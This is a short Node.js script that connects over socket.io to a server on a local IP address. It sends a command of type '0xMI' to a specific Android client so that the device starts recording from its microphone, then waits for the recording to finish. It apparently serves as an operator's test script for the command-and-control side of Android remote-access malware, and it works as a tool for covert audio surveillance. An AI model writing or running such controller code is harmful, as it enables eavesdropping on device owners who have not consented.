const io = require('socket.io-client');

// Connect to server
const socket = io('http://192.168.1.101:9400');

socket.on('connect', () => {
    console.log('✅ Connected to server');
    
    // Send a microphone command
    setTimeout(() => {
        console.log('📤 Sending microphone command...');
        
        socket.emit('send_command', {
            clientID: 'android_1758307357762_39', // Use the client ID from logs
            command: {
                type: '0xMI', // Microphone command
                uid: 'test_microphone_' + Date.now()
            }
        });
        
        console.log('✅ Microphone command sent successfully');
    }, 2000);
});

socket.on('disconnect', () => {
    console.log('❌ Disconnected from server');
});

socket.on('error', (error) => {
    console.error('❌ Socket error:', error);
});

// Keep alive
setTimeout(() => {
    console.log('⏰ Test completed');
    process.exit(0);
}, 15000); // Give more time for recording
